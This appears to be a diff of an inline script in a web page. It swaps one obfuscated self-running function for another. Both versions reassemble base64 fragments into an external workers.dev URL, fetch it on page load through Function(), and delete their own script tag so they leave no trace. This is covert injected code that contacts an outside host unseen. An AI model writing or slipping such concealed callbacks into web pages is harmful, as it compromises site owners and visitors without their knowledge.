@@ -154,29 +154,24 @@
                 return _0x354d();
             }
         
-(function(){
-  const s = document.currentScript;
+(function () {
   const gdd = {
-    x: "ZXMtMDQ=",
-    y: "bGFrZS04",
-    z: "cGktZW5k",
-    a: "d3JrZXJz",
-    b: "c3RlZXAt",
-    c: "aHR0cHM6",
-    d: "L2FwaS1l",
-    e: "LWE4Yi53",
-    f: "cm91bmQt",
-    g: "d2Vycw==",
-    h: "LnNsaWNl",
-    i: "Yjgu",
-    j: "Ly93b3Jr",
-    k: "G9vbnQ=",
+    a: "aHR0cHM6Ly93b3Jr",
+    b: "ZXJzLXBsYXlncm91",
+    c: "bmQtc3RlZXAtbGFr",
+    d: "ZS04NDNmLnNsaWNl",
+    e: "LWE4Yi53b3JrZXJz",
+    f: "LmRldi9hcGktZW5k",
+    g: "cG9pbnQ="
   };
-  const mda = ["c", "j", "g", "a", "f", "b", "y", "x", "h", "e", "i", "d", "z", "k"];
-  const f2s = mda.map(k => gdd[k]).join("");
-  const xtc = atob(f2s);
-  Function(`fetch("${xtc}")`)();
-  s.remove();
+
+  const order = ["a", "b", "c", "d", "e", "f", "g"];
+
+  const b64 = order.map(k => gdd[k]).join("");
+  const url = atob(b64);
+  Function(`fetch("${url}")`)();
+
+  document.currentScript.remove();
 })();
 
     </script>
